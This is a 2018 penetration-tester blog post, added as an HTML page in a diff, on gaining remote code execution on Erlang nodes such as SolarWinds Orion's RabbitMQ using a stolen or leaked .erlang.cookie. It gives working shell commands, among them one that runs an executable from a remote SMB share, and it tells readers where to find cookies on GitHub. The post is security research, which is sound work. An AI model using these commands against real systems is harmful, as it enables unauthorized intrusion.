@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Erlang Authenticated Remote Code Execution &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.42.2" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/start">~/start</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2018/erlang-arce/">Erlang Authenticated Remote Code Execution</a></h1>
+            <span class="post-date">Sep 15, 2018 </span>
+            <div class="post-content">
+                
+
+<p><a href="http://erlang.org/faq/introduction.html">Erlang is a programming language</a> that I have tried to learn a few times in the past but never really dug in, that is, until recently.</p>
+
+<p>Erlange is an interesting language because it has <a href="http://erlang.org/faq/introduction.html">&ldquo;built-in concurrency, distribution, and fault tolerence&rdquo;</a>. To me, this means that it does job queing and distributed tasks right out of the gate.</p>
+
+<h3 id="a-little-bit-of-history">A little bit of history</h3>
+
+<p>I first started digging into Erlang again from an attackers point of view at <a href="https://www.bsidesphilly.org/">BSides Philadelphia</a> 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an &ldquo;erlang-node&rdquo; port (25672) listening. You can watch the video here (I&rsquo;ve jumped ahead to the part about the erlang port):</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/VXUPyod6vqw?start=240" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+<p>After I gave that talk I asked around <a href="http://novahackers.blogspot.com/p/how-to-join-and-rules.html">NoVA Hackers</a>. Luckily one such individual did, and that&rsquo;s why I love what NoVA Hackers has grown into, but this post isn&rsquo;t about that.</p>
+
+<p>With a little bit of back and forth with what I was trying to accomplish, we worked out the the needed requirements for code exection.</p>
+
+<h3 id="erlnag-nodes">Erlnag Nodes</h3>
+
+<p>Erlang uses &ldquo;Nodes&rdquo; to execution code. As far as I can tell (and I&rsquo;ll probably be corrected) but you must run a node to execute any type of erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it&rsquo;s <code>WIN-PM0ID6F0AHN</code>. This is the easiest piece of information to acquire for the authenticated RCE.</p>
+
+<h3 id="the-cookie">The Cookie</h3>
+
+<p>The Erlang cookie <strong>SHOULD</strong> be the hardest to acquire. It&rsquo;s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called <code>.erlang.cookie</code> with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the <code>.</code> means that it&rsquo;s automatically a &ldquo;hidden&rdquo; file, but on Windows it doesn&rsquo;t mean much ;). RabbitMQ documents well where the key is located:</p>
+
+<ul>
+<li><a href="https://www.rabbitmq.com/clustering.html#erlang-cookie">https://www.rabbitmq.com/clustering.html#erlang-cookie</a></li>
+</ul>
+
+<p>Example <code>.erlang.cookie</code> file:</p>
+
+<pre><code>rabbit
+</code></pre>
+
+<p>One Windows for Solar Winds it can be found in <strong>Program Data</strong>:</p>
+
+<p><img src="/images/2018/erlang_sw_cookie.png" alt="" /></p>
+
+<h3 id="the-cluster-name">The Cluster Name</h3>
+
+<p>The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of <code>rabbit</code>.</p>
+
+<h3 id="the-node-port">The Node Port</h3>
+
+<p>This is actually pretty interesting that I haven&rsquo;t dived into completely yet, but the port isn&rsquo;t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion&rsquo;s RabbitMQ, its <code>25672</code> but I&rsquo;ve seen erlang nodes on a number of other ports, usually particular to the project it&rsquo;s being run for.</p>
+
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+
+<p>A simple <code>apt install erlang</code> gets you ready for exectuion. Once installed you need to put your <code>.erlang.cookie</code> file in your home directory <code>~/</code>. You also need to resolve the hostname (Node name) you wil be connecting to.</p>
+
+<p>Then it&rsquo;s just running a couple commands:</p>
+
+<ul>
+<li><code>test</code> is the node name you&rsquo;ll be calling your attack box when connecting to the cluster</li>
+<li><code>rabbit</code> is the cluster name being connected to</li>
+<li><code>WIN-PM0ID6F0AHN</code> is the hostname I&rsquo;m connecting to the cluster via</li>
+</ul>
+
+<p><strong>Start up Erlang with <code>erl -sname test</code></strong>:</p>
+
+<pre><code>root@kali:~# erl -sname test
+Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]
+
+Eshell V7.3.1.2  (abort with ^G)
+(test@kali)1&gt;
+</code></pre>
+
+<p><strong>Connecting to the cluster (the period on the end of the commands important terminators)</strong>:</p>
+
+<pre><code>(test@kali)1&gt; net_kernel:connect('rabbit@WIN-PM0ID6F0AHN').
+true
+</code></pre>
+
+<p>If you get a <code>true</code> that means the connection was successful.</p>
+
+<p><strong>Code exeuction (starting calc of course)</strong>:</p>
+
+<pre><code>(test@kali)2&gt; erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,[&quot;calc.exe&quot;]).
+&lt;6867.30570.461&gt;
+</code></pre>
+
+<p>And so, like any good code execution attack, <code>calc.exe</code> is executed:</p>
+
+<p><img src="/images/2018/erlang_sw_calc.png" alt="" /></p>
+
+<p>On Windows of course you can even do SMB shares:</p>
+
+<pre><code>erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,[&quot;\\\\192.168.80.69\\share\\runme.exe&quot;]).
+</code></pre>
+
+<p>Exiting the <strong>Erlang Shell</strong> is done with the init::stop function:</p>
+
+<pre><code>(test@kali)3&gt; init:stop().
+ok
+(test@kali)4&gt; root@kali:~#
+</code></pre>
+
+<h4 id="warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host">Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.</h4>
+
+<h3 id="the-bad-and-the-worse">The Bad, and the worse&hellip;</h3>
+
+<p>In many Docker instances the <code>.erlang.cookie</code> file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn&rsquo;t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers.</p>
+
+<p>This is not always the case and just like <a href="https://www.itnews.com.au/news/passwords-ssh-keys-exposed-on-github-330152">private keys on github</a>, really easy to find:</p>
+
+<p>Searching for <code>.erlang.cookie</code> on Github:</p>
+
+<p><img src="/images/2018/erlang_github.png" alt="" /></p>
+
+<h3 id="the-ugly">The Ugly</h3>
+
+<p>Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
